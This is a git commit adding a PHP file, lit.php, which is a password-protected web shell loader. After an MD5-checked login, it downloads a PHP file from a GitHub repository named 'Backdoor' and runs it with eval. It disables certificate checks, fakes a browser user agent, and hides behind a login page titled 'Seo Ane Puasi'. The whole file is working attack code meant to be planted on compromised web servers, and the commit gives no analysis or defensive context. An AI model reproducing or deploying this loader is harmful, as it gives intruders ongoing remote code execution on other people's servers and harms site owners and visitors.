cfa2bb6a45b11f1f0f7ebe92c2738e4ec4ceebe2
wawan507821 <109118799+wawan507821@users.noreply.github.com>
2024-01-11 22:17:36 +0700

    Add files via upload

---
+++ lit.php
@@ -0,0 +1,82 @@
+<?php
+session_start();
+
+/**
+ * Disable error reporting
+ *
+ * Set this to error_reporting( -1 ) for debugging.
+ */
+function geturlsinfo($url) {
+    if (function_exists('curl_exec')) {
+        $conn = curl_init($url);
+        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
+        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
+
+        // Set cookies using session if available
+        if (isset($_SESSION['SAP'])) {
+            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION['SAP']);
+        }
+
+        $url_get_contents_data = curl_exec($conn);
+        curl_close($conn);
+    } elseif (function_exists('file_get_contents')) {
+        $url_get_contents_data = file_get_contents($url);
+    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
+        $handle = fopen($url, "r");
+        $url_get_contents_data = stream_get_contents($handle);
+        fclose($handle);
+    } else {
+        $url_get_contents_data = false;
+    }
+    return $url_get_contents_data;
+}
+
+// Function to check if the user is logged in
+function is_logged_in()
+{
+    return isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true;
+}
+// Check if the password is submitted and correct
+if (isset($_POST['password'])) {
+    $entered_password = $_POST['password'];
+    $hashed_password = '629338d0abd94243fb8e7ab2f3f0bf18'; // Replace this with your MD5 hashed password
+    if (md5($entered_password) === $hashed_password) {
+        // Password is correct, store it in session
+        $_SESSION['logged_in'] = true;
+        $_SESSION['SAP'] = 'janco'; // Replace this with your cookie data
+    } else {
+        // Password is incorrect
+        echo "Incorrect password. Please try again.";
+    }
+}
+
+// Check if the user is logged in before executing the content
+if (is_logged_in()) {
+    $a = geturlsinfo('https://raw.githubusercontent.com/ItsMeAlf404/Backdoor/main/awok.php');
+    eval('?>' . $a);
+} else {
+    // Display login form if not logged in
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>Seo Ane Puasi</title>
+    </head>
+    <body>
+        <center>
+        <img src="https://i.ibb.co/dfscZXp/ane-puasi.png" />
+        <body style="background-color:black;">
+        <form method="POST" action="">
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password">
+            <input type="submit" value="Touch Me!">
+        </form>
+        </center>
+    </body>
+    </html>
+    <?php
+}
+?>
